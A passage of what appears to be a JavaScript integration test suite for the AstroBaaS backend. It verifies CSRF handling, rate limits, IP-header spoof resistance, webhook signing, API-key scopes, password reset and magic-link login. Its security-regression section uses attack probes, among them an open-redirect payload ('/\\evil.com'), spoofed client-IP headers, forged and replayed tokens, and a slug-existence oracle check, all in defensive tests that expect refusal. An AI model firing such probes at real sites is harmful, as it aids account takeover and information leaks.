    const adminHdrs = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    const limitOf = (r) => Number(r.headers.get('ratelimit-limit'));
    const setsCsrf = (r) => setCookies(r).some((c) => c.startsWith('astrobaas_csrf='));

    /* ---- S3.13: the CSRF cookie only where a page reads it ---- */
    {
      const api = await fetch(`${BASE}/api/posts`);
      if (api.status === 200 && !setsCsrf(api)) ok('S3.13: an anonymous API GET sets no CSRF cookie (a CDN may cache it)');
      else fail('S3.13 api cookie', `status=${api.status} set-cookie=${JSON.stringify(setCookies(api))}`);

      const xml = await fetch(`${BASE}/sitemap.xml`);
      if (!setsCsrf(xml)) ok('S3.13: a non-HTML response sets no CSRF cookie');
      else fail('S3.13 sitemap cookie', JSON.stringify(setCookies(xml)));

      const page = await fetch(`${BASE}/login`);
      if (page.status === 200 && setsCsrf(page)) ok('S3.13: an HTML page still sets it — its forms need it');
      else fail('S3.13 page cookie', `status=${page.status} set-cookie=${JSON.stringify(setCookies(page))}`);

      // The admin UI's path: a session with no CSRF cookie loads an admin page,
      // is handed a token, and that token authorises a write.
      const admin = await fetch(`${BASE}/admin`, { headers: { Cookie: sessionCookie } });
      const pageTok = decodeURIComponent(cookieFrom(admin, 'astrobaas_csrf').split('=')[1] ?? '');
      const html = await admin.text();
      if (admin.status === 200 && pageTok && html.includes(`content="${pageTok}"`)) {
        ok('S3.13: an admin page sets the cookie AND renders the same token for its scripts');
      } else fail('S3.13 admin page token', `status=${admin.status} token=${!!pageTok}`);
      if (pageTok) {
        const write = await fetch(`${BASE}/api/posts`, {
          method: 'POST',
          headers: { Cookie: `${sessionCookie}; astrobaas_csrf=${encodeURIComponent(pageTok)}`, 'Content-Type': 'application/json', 'X-CSRF-Token': pageTok },
          body: JSON.stringify({ title: 'CSRF token from an admin page', status: 'draft' }),
        });
        if (write.status === 201) ok('S3.13: ...and that page-issued token authorises an API write');
        else fail('S3.13 page token write', `status=${write.status}`);
      }
    }

    /* ---- S3.7: a write with no Content-Length is refused ---- */
    {
      const body = JSON.stringify({ name: 'Chunked', email: 'chunked@example.com', message: 'streamed body' });
      const stream = new ReadableStream({
        start(c) { c.enqueue(new TextEncoder().encode(body)); c.close(); },
      });
      const chunked = await fetch(`${BASE}/api/contact`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' }, body: stream, duplex: 'half',
      });
      const cj = await chunked.json().catch(() => null);
      if (chunked.status === 411 && cj?.error?.code === 'LENGTH_REQUIRED') {
        ok('S3.7: a chunked write (no Content-Length) is refused with 411 LENGTH_REQUIRED');
      } else fail('S3.7 chunked write', `status=${chunked.status} body=${JSON.stringify(cj)}`);

      // The same write WITH a length gets past this gate (and is then refused
      // by CSRF, which is the next thing it would meet).
      const framed = await fetch(`${BASE}/api/contact`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' }, body,
      });
      if (framed.status !== 411) ok(`S3.7: the same write with a Content-Length is not refused for length (${framed.status})`);
      else fail('S3.7 framed write', 'a Content-Length write got 411');
    }

    /* ---- S3.4: which buckets a request is charged to ---- */
    {
      const anon = await fetch(`${BASE}/api/products`);
      if (limitOf(anon) === 100000) ok('S3.4: a plain catalogue read is charged to the general bucket only');
      else fail('S3.4 catalogue read', `RateLimit-Limit=${limitOf(anon)}`);

      const searching = await fetch(`${BASE}/api/products?search=smoke`);
      const siteSearch = await fetch(`${BASE}/api/search?q=smoke`);
      if (limitOf(searching) === 3004 && limitOf(siteSearch) === 3004) ok('S3.4: a catalogue search and /api/search share the search bucket');
      else fail('S3.4 search bucket', `products?search=${limitOf(searching)} search=${limitOf(siteSearch)}`);

      const xo = (p, b) => fetch(`${BASE}${p}`, {
        method: 'POST', headers: { 'Content-Type': 'application/json', Origin: STORE }, body: JSON.stringify(b),
      });
      const quote = await xo('/api/orders/quote', { items: [] });
      const order = await xo('/api/orders', { items: [] });
      const start = await xo('/api/payments/start', {});
      if (limitOf(quote) === 3002) ok('S3.4: an anonymous quote is charged to the quote bucket');
      else fail('S3.4 quote bucket', `status=${quote.status} RateLimit-Limit=${limitOf(quote)}`);
      if (limitOf(order) === 3001) ok('S3.4: an anonymous checkout is charged to the checkout bucket');
      else fail('S3.4 checkout bucket', `status=${order.status} RateLimit-Limit=${limitOf(order)}`);
      if (limitOf(start) === 3003) ok('S3.4: an anonymous payment start is charged to its own bucket');
      else fail('S3.4 payment-start bucket', `status=${start.status} RateLimit-Limit=${limitOf(start)}`);

      const staffQuote = await fetch(`${BASE}/api/orders/quote`, { method: 'POST', headers: adminHdrs, body: JSON.stringify({ items: [] }) });
      if (limitOf(staffQuote) === 100000) ok('S3.4: a staff session is never charged per route');
      else fail('S3.4 staff quote', `RateLimit-Limit=${limitOf(staffQuote)}`);

      // Webhooks: out of the anonymous bucket, into their own.
      const general = async () => Number((await fetch(`${BASE}/api/posts`)).headers.get('ratelimit-remaining'));
      let spentOnHooks = -1;
      let hookLimit = 0;
      for (let attempt = 0; attempt < 2 && spentOnHooks < 0; attempt += 1) {
        const before = await general();
        for (let i = 0; i < 3; i += 1) {
          const h = await fetch(`${BASE}/api/payments/webhook/not-a-provider`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{}' });
          hookLimit = limitOf(h);
        }
        const after = await general();
        // A window rolling over between the two reads resets the count; retry once.
        if (after < before) spentOnHooks = before - after - 1;
      }
      if (hookLimit === 3005) ok('S3.4: a payment webhook is charged to the webhook bucket');
      else fail('S3.4 webhook bucket', `RateLimit-Limit=${hookLimit}`);
      if (spentOnHooks === 0) ok('S3.4: ...and spends nothing from the anonymous bucket');
      else fail('S3.4 webhook anonymous spend', `three webhooks spent ${spentOnHooks} from the general bucket`);
    }

    /* ---- S3.6: trusted client-IP forwarding ---- */
    {
      const mint = async (body) => {
        const r = await fetch(`${BASE}/api/keys`, { method: 'POST', headers: adminHdrs, body: JSON.stringify(body) });
        return (await r.json().catch(() => null))?.data ?? null;
      };
      const bff = await mint({ name: 'smoke-bff', role: 'admin', forward_client_ip: true });
      const plain = await mint({ name: 'smoke-plain-key', role: 'admin' });
      const editorKey = await mint({ name: 'smoke-editor-key', role: 'editor' });
      if (bff?.forward_client_ip === true && plain?.forward_client_ip === false) ok('S3.6: an admin can mint a forwarding key; the default is off');
      else fail('S3.6 mint', JSON.stringify({ bff: bff?.forward_client_ip, plain: plain?.forward_client_ip }));

      const SHOPPER = '203.0.113.77';
      const asKey = (key, extra = {}) => ({ Authorization: `Bearer ${key}`, 'Content-Type': 'application/json', ...extra });
      const quoteAs = (key, extra) => fetch(`${BASE}/api/orders/quote`, { method: 'POST', headers: asKey(key, extra), body: JSON.stringify({ items: [] }) });

      if (bff?.key && plain?.key) {
        const fwd = await quoteAs(bff.key, { 'X-AstroBaaS-Client-IP': SHOPPER });
        if (limitOf(fwd) === 3002) ok('S3.6: a forwarding key\'s shopper is charged to the per-IP quote bucket');
        else fail('S3.6 forwarded quote', `RateLimit-Limit=${limitOf(fwd)}`);
        const bare = await quoteAs(bff.key);
        if (limitOf(bare) === 6000) ok('S3.6: ...without the header, the key is charged to its own bucket only');
        else fail('S3.6 forwarding key without header', `RateLimit-Limit=${limitOf(bare)}`);
        const spoof = await quoteAs(plain.key, { 'X-AstroBaaS-Client-IP': SHOPPER });
        if (limitOf(spoof) === 6000) ok('S3.6: an UNMARKED key\'s header is ignored (no per-shopper bucket)');
        else fail('S3.6 unmarked key', `RateLimit-Limit=${limitOf(spoof)}`);

        // What locals.ip became, read back from the audit trail: each key mints
        // a throwaway key while naming a shopper.
        await fetch(`${BASE}/api/keys`, { method: 'POST', headers: asKey(bff.key, { 'X-AstroBaaS-Client-IP': SHOPPER }), body: JSON.stringify({ name: 'minted-through-bff' }) });
        await fetch(`${BASE}/api/keys`, { method: 'POST', headers: asKey(plain.key, { 'X-AstroBaaS-Client-IP': SHOPPER }), body: JSON.stringify({ name: 'minted-through-plain' }) });
        await fetch(`${BASE}/api/keys`, { method: 'POST', headers: asKey(bff.key, { 'X-AstroBaaS-Client-IP': '203.0.113.77, 10.0.0.1' }), body: JSON.stringify({ name: 'minted-with-a-list' }) });
        // ...and an anonymous caller tries the same header on the sign-in form.
        await fetch(`${BASE}/api/auth/login`, {
          method: 'POST', headers: { 'Content-Type': 'application/json', 'X-AstroBaaS-Client-IP': '203.0.113.88' },
          body: JSON.stringify({ email: 'spoof-probe@example.com', password: 'not-the-password' }),
        });
        await wait(300);
        const auditFor = async (action, actor) => {
          const j = await (await fetch(`${BASE}/api/audit?action=${encodeURIComponent(action)}&actor=${encodeURIComponent(actor)}&limit=20`, { headers: { Cookie: sessionCookie } })).json().catch(() => null);
          return Array.isArray(j?.data) ? j.data : [];
        };
        const viaBff = await auditFor('apikey.create', `apikey:${bff.id}`);
        const viaPlain = await auditFor('apikey.create', `apikey:${plain.id}`);
        const spoofed = await auditFor('auth.login.failed', 'spoof-probe@example.com');
        if (viaBff.some((e) => e.ip === SHOPPER)) ok('S3.6: a forwarding key\'s shopper address is what the audit trail records');
        else fail('S3.6 forwarded ip', JSON.stringify(viaBff.map((e) => e.ip)));
        if (viaBff.some((e) => e.ip !== SHOPPER && typeof e.ip === 'string')) ok('S3.6: ...but a LIST in the header is refused, not picked from');
        else fail('S3.6 forwarded list', JSON.stringify(viaBff.map((e) => e.ip)));
        if (viaPlain.length && viaPlain.every((e) => e.ip !== SHOPPER)) ok('S3.6: an unmarked key cannot spoof the address');
        else fail('S3.6 unmarked spoof', JSON.stringify(viaPlain.map((e) => e.ip)));
        if (spoofed.length && spoofed.every((e) => e.ip !== '203.0.113.88')) ok('S3.6: an anonymous caller cannot spoof the address');
        else fail('S3.6 anonymous spoof', JSON.stringify(spoofed.map((e) => e.ip)));

        // Only an admin can change the flag, and switching it off takes effect.
        if (editorKey?.key) {
          const denied = await fetch(`${BASE}/api/keys/${bff.id}`, { method: 'PATCH', headers: asKey(editorKey.key), body: JSON.stringify({ forward_client_ip: true }) });
          if (denied.status === 403) ok('S3.6: a non-admin key cannot change forwarding');
          else fail('S3.6 non-admin patch', `status=${denied.status}`);
        }
        const off = await fetch(`${BASE}/api/keys/${bff.id}`, { method: 'PATCH', headers: adminHdrs, body: JSON.stringify({ forward_client_ip: false }) });
        const offJ = await off.json().catch(() => null);
        if (off.status === 200 && offJ?.data?.forward_client_ip === false && !('key_hash' in (offJ?.data ?? {}))) {
          ok('S3.6: an admin can switch forwarding off in place (no secret in the answer)');
        } else fail('S3.6 patch off', `status=${off.status} ${JSON.stringify(offJ)}`);
        const afterOff = await quoteAs(bff.key, { 'X-AstroBaaS-Client-IP': SHOPPER });
        if (limitOf(afterOff) === 6000) ok('S3.6: ...and from then on its header is ignored');
        else fail('S3.6 after off', `RateLimit-Limit=${limitOf(afterOff)}`);
      }
    }
  }

  // 7d. Outbound webhooks: register a receiver, trigger post.created, assert a
  // signed delivery arrives with a verifiable HMAC signature.
  if (sessionCookie && csrfToken) {
    const adminHdrs = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    const receiver = await startWebhookReceiver();
    try {
      // Register a webhook for post.created.
      const reg = await fetch(`${BASE}/api/webhooks`, {
        method: 'POST',
        headers: adminHdrs,
        body: JSON.stringify({ url: receiver.url, events: ['post.created'] }),
      });
      const rj = await reg.json().catch(() => null);
      const secret = rj?.data?.secret;
      const webhookId = rj?.data?.id;
      if (reg.status === 201 && typeof secret === 'string' && secret.length >= 24) {
        ok('POST /api/webhooks registers a hook (secret returned once)');
      } else {
        fail('POST /api/webhooks', `status=${reg.status} ${JSON.stringify(rj)}`);
      }

      // GET list must NOT leak the signing secret.
      const list = await fetch(`${BASE}/api/webhooks`, { headers: { Cookie: sessionCookie } });
      const lj = await list.json().catch(() => null);
      const leaks = Array.isArray(lj?.data) && lj.data.some((w) => 'secret' in w);
      if (list.status === 200 && !leaks) ok('GET /api/webhooks lists hooks without the secret');
      else fail('GET /api/webhooks', `status=${list.status} leaks=${leaks}`);

      if (secret) {
        // Trigger the event by creating a post.
        await fetch(`${BASE}/api/posts`, {
          method: 'POST',
          headers: adminHdrs,
          body: JSON.stringify({ title: 'Webhook trigger post', status: 'draft' }),
        });
        const delivery = await receiver.waitFor(6000);
        if (delivery) {
          ok('webhook delivered on post.created');
          const evHeader = delivery.headers['x-astrobaas-event'];
          const sigHeader = delivery.headers['x-astrobaas-signature'] || '';
          const expected = 'sha256=' + crypto.createHmac('sha256', secret).update(delivery.body).digest('hex');
          if (evHeader === 'post.created') ok('webhook carries X-AstroBaaS-Event header');
          else fail('webhook event header', String(evHeader));
          if (sigHeader === expected) ok('webhook HMAC signature verifies against the secret');
          else fail('webhook signature', `got ${sigHeader} want ${expected}`);
          const parsed = JSON.parse(delivery.body);
          if (parsed?.event === 'post.created' && parsed?.data?.title === 'Webhook trigger post')
            ok('webhook body embeds event + entity data');
          else fail('webhook body', delivery.body.slice(0, 120));
        } else {
          fail('webhook delivery', 'no delivery within 6s');
        }
      }

      // Cleanup: unregister.
      if (webhookId) {
        const del = await fetch(`${BASE}/api/webhooks/${webhookId}`, { method: 'DELETE', headers: adminHdrs });
        if (del.status === 200) ok('DELETE /api/webhooks/:id unregisters the hook');
        else fail('DELETE /api/webhooks', `status=${del.status}`);
      }
    } catch (e) {
      fail('webhook live integration', String(e?.stack || e));
    } finally {
      await receiver.close();
    }
  }

  // 7d-2. Webhook durability: a receiver that FAILS the first attempt then
  // succeeds → the delivery log records the retry and ends 'success'. Then
  // exercise the delivery-log endpoint + manual redeliver.
  if (sessionCookie && csrfToken) {
    const adminHdrs = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    // Fail the very first delivery (500), succeed afterwards.
    const flaky = await startWebhookReceiver((count) => (count === 1 ? 500 : 200));
    try {
      const reg = await fetch(`${BASE}/api/webhooks`, {
        method: 'POST',
        headers: adminHdrs,
        body: JSON.stringify({ url: flaky.url, events: ['post.created'] }),
      });
      const webhookId = (await reg.json().catch(() => null))?.data?.id;

      // Trigger an event.
      await fetch(`${BASE}/api/posts`, {
        method: 'POST',
        headers: adminHdrs,
        body: JSON.stringify({ title: 'Retry trigger', status: 'draft' }),
      });

      // First attempt (fail) + retry (success) = 2 hits within the fast backoff.
      const gotTwo = await flaky.waitForCount(2, 6000);
      if (gotTwo) ok('webhook retried after a failed attempt (2 deliveries)');
      else fail('webhook retry', `only ${flaky.deliveries.length} delivery(ies)`);

      // The delivery log records the success with attempts >= 2.
      //
      // POLLED, not slept-on, and searched rather than indexed. A fixed 300ms
      // wait plus `data[0]` made this the suite's one non-deterministic
      // assertion: the server writes the log after the retry lands, so on a
      // cold Vite cache (exactly CI's condition) 300ms was not enough, and
      // `data[0]` could be a different delivery to the same webhook. It failed
      // twice on cold runs and passed on warm ones.
      let rec = null;
      let logStatus = 0;
      for (const deadline = Date.now() + 8000; Date.now() < deadline;) {
        const log = await fetch(`${BASE}/api/webhooks/deliveries?webhook=${webhookId}`, { headers: { Cookie: sessionCookie } });
        logStatus = log.status;
        const lj = await log.json().catch(() => null);
        rec = (Array.isArray(lj?.data) ? lj.data : []).find((d) => d?.attempts >= 2) ?? null;
        if (rec) break;
        await wait(200);
      }
      if (logStatus === 200 && rec && rec.status === 'success' && rec.attempts >= 2)
        ok('GET /api/webhooks/deliveries shows success after retry (attempts>=2)');
      else fail('delivery log', `status=${logStatus} rec=${JSON.stringify(rec)}`);

      // Manual redeliver → the receiver gets one more identical, signed delivery.
      if (rec?.id) {
        const before = flaky.deliveries.length;
        const re = await fetch(`${BASE}/api/webhooks/deliveries/${rec.id}/redeliver`, { method: 'POST', headers: adminHdrs });
        const got = await flaky.waitForCount(before + 1, 4000);
        if (re.status === 200 && got) ok('POST /api/webhooks/deliveries/{id}/redeliver re-sends the payload');
        else fail('redeliver', `status=${re.status} delivered=${got}`);
      }

      if (webhookId) {
        await fetch(`${BASE}/api/webhooks/${webhookId}`, { method: 'DELETE', headers: adminHdrs });
      }
    } catch (e) {
      fail('webhook durability', String(e?.stack || e));
    } finally {
      await flaky.close();
    }
  }

  // 7e. API-key scopes + expiry + rotation.
  if (sessionCookie && csrfToken) {
    const adminHdrs = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    const mintKey = async (payload) => {
      const r = await fetch(`${BASE}/api/keys`, { method: 'POST', headers: adminHdrs, body: JSON.stringify(payload) });
      const j = await r.json().catch(() => null);
      return { status: r.status, data: j?.data };
    };
    const writePost = (key) =>
      fetch(`${BASE}/api/posts`, {
        method: 'POST',
        headers: { Authorization: `Bearer ${key}`, 'Content-Type': 'application/json' },
        body: JSON.stringify({ title: 'scope probe', status: 'draft' }),
      });

    // A read-only scoped key may NOT write.
    const ro = await mintKey({ name: 'ro', role: 'editor', scopes: ['posts:read'] });
    if (ro.status === 201 && ro.data?.key) {
      const w = await writePost(ro.data.key);
      if (w.status === 403) ok('scoped key (posts:read) is denied a write (403)');
      else fail('scope write denial', `expected 403, got ${w.status}`);
    } else fail('mint scoped key', `status=${ro.status}`);

    // A write-scoped key may write.
    const rw = await mintKey({ name: 'rw', role: 'editor', scopes: ['posts:write'] });
    if (rw.status === 201 && rw.data?.key) {
      const w = await writePost(rw.data.key);
      if (w.status === 201) ok('scoped key (posts:write) is allowed a write (201)');
      else fail('scope write allow', `expected 201, got ${w.status}`);

      // Deny-by-default: a scoped key must NOT reach endpoints outside its
      // scoped resources, regardless of its role.
      const off = await fetch(`${BASE}/api/keys`, { headers: { Authorization: `Bearer ${rw.data.key}` } });
      if (off.status === 403) ok('scoped key is denied outside its scopes (GET /api/keys → 403)');
      else fail('scoped-key deny-by-default', `expected 403, got ${off.status}`);

      // …but introspection stays available.
      const me = await fetch(`${BASE}/api/auth/me`, { headers: { Authorization: `Bearer ${rw.data.key}` } });
      if (me.status === 200) ok('scoped key can still GET /api/auth/me');
      else fail('scoped-key introspection', `expected 200, got ${me.status}`);
    } else fail('mint write-scoped key', `status=${rw.status}`);

    // --- D2-2: a scoped key gets no ELEVATION on a public path ---
    //
    // The scope gate used to be skipped entirely for public GETs, on the
    // reasoning that a public path leaks nothing. But bearer auth also
    // IDENTIFIES the caller, and /api/posts widens its result set for an
    // identified viewer — so a key scoped to products read every unpublished
    // draft in the system. Confirmed by driving it before the fix.
    //
    // The rule now: on a public GET, a key whose scopes don't name the
    // resource is treated as ANONYMOUS. It keeps the access, loses the
    // elevation.
    const scopedOther = await mintKey({ name: 'products-only', role: 'editor', scopes: ['products:read'] });
    if (scopedOther.status === 201 && scopedOther.data?.key) {
      const bearer = { Authorization: `Bearer ${scopedOther.data.key}` };

      const asKey = await fetch(`${BASE}/api/posts?status=draft`, { headers: bearer });
      const asAnon = await fetch(`${BASE}/api/posts?status=draft`);
      const titles = async (r) => {
        const j = await r.json().catch(() => ({}));
        const items = j?.data?.items || j?.data || j?.items || [];
        return (Array.isArray(items) ? items : []).map((p) => p.title).sort();
      };
      const keySees = await titles(asKey);
      const anonSees = await titles(asAnon);

      if (asKey.status === 200 && JSON.stringify(keySees) === JSON.stringify(anonSees)) {
        ok('D2-2: an out-of-scope key sees exactly what anonymous sees on a public GET');
      } else {
        fail('D2-2 scope elevation',
          `status=${asKey.status} key=${JSON.stringify(keySees)} anon=${JSON.stringify(anonSees)}`);
      }

      // The downgrade must not turn into a denial: public paths that map to NO
      // scope (settings, locales, themes) have nothing an operator could grant,
      // so 403 there would break a headless storefront unfixably.
      const unscopable = await fetch(`${BASE}/api/settings/get`, { headers: bearer });
      if (unscopable.status === 200) ok('D2-2: an unscopable public path stays readable with a scoped key');
      else fail('D2-2 over-denial', `GET /api/settings/get with a scoped key → ${unscopable.status}, expected 200`);

      // And a NON-public path outside scope is still a hard 403.
      const denied = await fetch(`${BASE}/api/users`, { headers: bearer });
      if (denied.status === 403) ok('D2-2: a non-public path outside scope is still 403');
      else fail('D2-2 under-denial', `GET /api/users with a products key → ${denied.status}, expected 403`);
    } else fail('mint products-scoped key', `status=${scopedOther.status}`);

    // Expiry metadata is returned on mint.
    const exp = await mintKey({ name: 'exp', role: 'editor', expires_in_days: 1 });
    if (exp.status === 201 && typeof exp.data?.expires_at === 'string') ok('mint returns expires_at when expires_in_days set');
    else fail('expiry mint', `status=${exp.status} expires_at=${exp.data?.expires_at}`);

    // Rotation: old secret stops working, new one authenticates.
    const rot = await mintKey({ name: 'rot', role: 'editor' });
    if (rot.status === 201 && rot.data?.key && rot.data?.id) {
      const before = await writePost(rot.data.key);
      const rotateRes = await fetch(`${BASE}/api/keys/${rot.data.id}/rotate`, { method: 'POST', headers: adminHdrs });
      const rj = await rotateRes.json().catch(() => null);
      const newKey = rj?.data?.key;
      const oldAfter = await writePost(rot.data.key);
      const newAfter = newKey ? await writePost(newKey) : { status: 0 };
      if (before.status === 201 && rotateRes.status === 200 && oldAfter.status === 401 && newAfter.status === 201) {
        ok('key rotation: old secret → 401, new secret → 201');
      } else {
        fail('key rotation', `before=${before.status} rotate=${rotateRes.status} old=${oldAfter.status} new=${newAfter.status}`);
      }
    } else fail('mint rotation key', `status=${rot.status}`);
  }

  // 7f. Password reset end-to-end: create a user, request a reset, capture the
  // emailed token (via the webhook email transport), reset, and verify login.
  if (sessionCookie && csrfToken) {
    const adminHdrs = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    const RESET_EMAIL = 'resettest@example.com';
    const OLD_PW = 'Initial#Pass1';
    const NEW_PW = 'Rotated#Pass2';
    const login = (password) =>
      fetch(`${BASE}/api/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: RESET_EMAIL, password }),
      });

    const mk = await fetch(`${BASE}/api/users/create`, {
      method: 'POST',
      headers: adminHdrs,
      body: JSON.stringify({ name: 'Reset Test', email: RESET_EMAIL, role: 'author', password: OLD_PW }),
    });
    if (mk.status === 201) {
      const preLogin = await login(OLD_PW);
      if (preLogin.status === 200) ok('reset: new user can log in with its initial password');
      else fail('reset setup login', `status=${preLogin.status}`);

      // Request the reset; the endpoint always returns a generic 200.
      const forgot = await fetch(`${BASE}/api/auth/forgot`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: RESET_EMAIL }),
      });
      if (forgot.status === 200) ok('POST /api/auth/forgot returns a generic 200');
      else fail('forgot', `status=${forgot.status}`);

      // The email was delivered to our webhook receiver — pull the token out.
      const mail = await emailReceiver.waitFor(6000);
      let token = '';
      if (mail) {
        const parsed = JSON.parse(mail.body);
        const m = /reset-password\?token=([^\s"']+)/.exec(parsed.text || '');
        token = m ? decodeURIComponent(m[1]) : '';
        if (parsed.to === RESET_EMAIL && token) ok('reset email delivered with a token link');
        else fail('reset email', `to=${parsed.to} token=${!!token}`);
      } else {
        fail('reset email', 'no email delivered within 6s');
      }

      if (token) {
        const reset = await fetch(`${BASE}/api/auth/reset`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ token, password: NEW_PW }),
        });
        if (reset.status === 200) ok('POST /api/auth/reset accepts a valid token');
        else fail('reset', `status=${reset.status}`);

        const newLogin = await login(NEW_PW);
        if (newLogin.status === 200) ok('reset: login works with the NEW password');
        else fail('reset new login', `status=${newLogin.status}`);

        const oldLogin = await login(OLD_PW);
        if (oldLogin.status === 401) ok('reset: the OLD password no longer works');
        else fail('reset old login', `expected 401, got ${oldLogin.status}`);

        // Single-use: replaying the same token must fail (salt changed).
        const replay = await fetch(`${BASE}/api/auth/reset`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ token, password: 'Another#Pass3' }),
        });
        if (replay.status === 400) ok('reset token is single-use (replay → 400)');
        else fail('reset replay', `expected 400, got ${replay.status}`);
      }
    } else {
      fail('reset: create test user', `status=${mk.status}`);
    }
  }

  // 7f. Magic-link login, the whole loop through a real mailbox (the webhook
  // receiver): request → email arrives → the link signs in ONCE → the second
  // click is dead → the login page advertises the option (the email channel
  // here is the webhook transport, so the gate is open).
  if (sessionCookie && csrfToken) {
    const req = await fetch(`${BASE}/api/auth/magic-link`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: 'admin@local' }),
    });
    if (req.status === 200) ok('POST /api/auth/magic-link returns a generic 200');
    else fail('magic-link request', `status=${req.status}`);

    // Wait for OUR email, identified by recipient and content — the send is
    // fire-and-forget (so its latency cannot leak whether the account exists),
    // so it may arrive after the response and after other messages.
    const mail = await emailReceiver.waitForMatching(
      (m) => m.to === 'admin@local' && /\/api\/auth\/magic\?token=/.test(m.text || ''),
      8000,
    );
    let magicUrl = '';
    if (mail) {
      magicUrl = (/(\/api\/auth\/magic\?token=[^\s"']+)/.exec(mail.text || '') || [])[1] || '';
      if (magicUrl) ok('magic-link email delivered with a link');
      else fail('magic-link email', 'matched the message but found no link');
    } else {
      fail('magic-link email', 'no magic-link email for admin@local within 8s');
    }

    if (magicUrl) {
      const click = await fetch(`${BASE}${magicUrl}`, { redirect: 'manual' });
      const setCookie = click.headers.get('set-cookie') || '';
      const loc = click.headers.get('location') || '';
      if (click.status === 303 && loc === '/admin' && setCookie.includes('astrobaas_session=')) {
        ok('magic link signs in (303 → /admin with a session cookie)');
      } else fail('magic link consume', `status=${click.status} loc=${loc} cookie=${setCookie.slice(0, 40)}`);

      const session = /astrobaas_session=([^;]+)/.exec(setCookie)?.[1] ?? '';
      const me = await fetch(`${BASE}/api/auth/me`, { headers: { Cookie: `astrobaas_session=${session}` } });
      const meJson = await me.json().catch(() => null);
      if (me.status === 200 && meJson?.data?.email === 'admin@local') ok('magic-link session is a real session');
      else fail('magic-link session', `status=${me.status}`);

      const replay = await fetch(`${BASE}${magicUrl}`, { redirect: 'manual' });
      const replayLoc = replay.headers.get('location') || '';
      if (replay.status === 303 && replayLoc.includes('error=magic') && !(replay.headers.get('set-cookie') || '').includes('astrobaas_session=')) {
        ok('magic link is single-use (second click → error, no session)');
      } else fail('magic link replay', `status=${replay.status} loc=${replayLoc}`);

      const forged = await fetch(`${BASE}/api/auth/magic?token=forged.token`, { redirect: 'manual' });
      if (forged.status === 303 && (forged.headers.get('location') || '').includes('error=magic')) {
        ok('a forged magic token is politely refused');
      } else fail('magic forged token', `status=${forged.status}`);
    }

    const loginPage = await (await fetch(`${BASE}/login`)).text();
    if (loginPage.includes('/api/auth/magic-link')) ok('login page offers the sign-in link option (email channel active)');
    else fail('login page magic option', 'no magic-link form in /login HTML');
  }

  // 7g. Security regressions.
  if (sessionCookie && csrfToken) {
    const adminHdrs = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };

    // 7g-1. Open redirect: `next=/\evil.com` must fall back to /admin (browsers
    // normalize backslash to slash, turning it protocol-relative).
    {
      const r = await fetch(`${BASE}/api/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({ email: 'admin@local', password: 'admin', next: '/\\evil.com' }).toString(),
        redirect: 'manual',
      });
      const loc = r.headers.get('location') || '';
      if (r.status === 303 && loc === '/admin') ok('login rejects /\\evil.com redirect (falls back to /admin)');
      else fail('open redirect', `status=${r.status} location=${loc}`);
    }

    // 7g-2. Role gating: an author reaches /admin but NOT admin-only screens.
    {
      const authorLogin = await fetch(`${BASE}/api/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: 'resettest@example.com', password: 'Rotated#Pass2' }),
      });
      const setC = authorLogin.headers.get('set-cookie') || '';
      const m = /astrobaas_session=([^;]+)/.exec(setC);
      if (authorLogin.status === 200 && m) {
        const authorCookie = `astrobaas_session=${m[1]}`;
        const dash = await fetch(`${BASE}/admin`, { headers: { Cookie: authorCookie }, redirect: 'manual' });
        if (dash.status === 200) ok('author (staff) can open /admin');
        else fail('author /admin', `expected 200, got ${dash.status}`);
        for (const p of ['/admin/users', '/admin/api-keys', '/admin/webhooks', '/admin/audit', '/admin/settings', '/admin/privacy', '/admin/import']) {
          const r = await fetch(`${BASE}${p}`, { headers: { Cookie: authorCookie }, redirect: 'manual' });
          const loc = r.headers.get('location') || '';
          if (r.status >= 300 && r.status < 400 && loc.endsWith('/admin')) ok(`author is redirected away from ${p}`);
          else fail(`author gate ${p}`, `status=${r.status} location=${loc}`);
        }

        // --- D2-6: the revisions endpoint must not be a slug oracle ---
        //
        // It used to answer 404 for "no such post" and 403 for "not your
        // post", so any author could walk a wordlist and read off which slugs
        // exist from the status code alone. On an editorial site the slugs ARE
        // the leak — `q3-layoffs`, `acquisition-announcement` — and they are
        // readable long before the body is written.
        //
        // Both must now be the same 404. Compared directly rather than each
        // asserted against a literal, because the property under test is that
        // they are INDISTINGUISHABLE, not that either has a particular value.
        const someoneElsesPost = 'welcome-to-astrobaas'; // seeded, authored by the admin
        const nonexistent = 'this-slug-does-not-exist-at-all-9f3c';
        const [existing, missing] = await Promise.all([
          fetch(`${BASE}/api/posts/${someoneElsesPost}/revisions`, { headers: { Cookie: authorCookie } }),
          fetch(`${BASE}/api/posts/${nonexistent}/revisions`, { headers: { Cookie: authorCookie } }),
        ]);
        if (existing.status === missing.status && existing.status === 404) {
          ok("D2-6: an author cannot tell another's post from a missing one (both 404)");
        } else {
          fail('D2-6 slug oracle',
            `existing-but-not-mine=${existing.status} nonexistent=${missing.status} — must both be 404`);
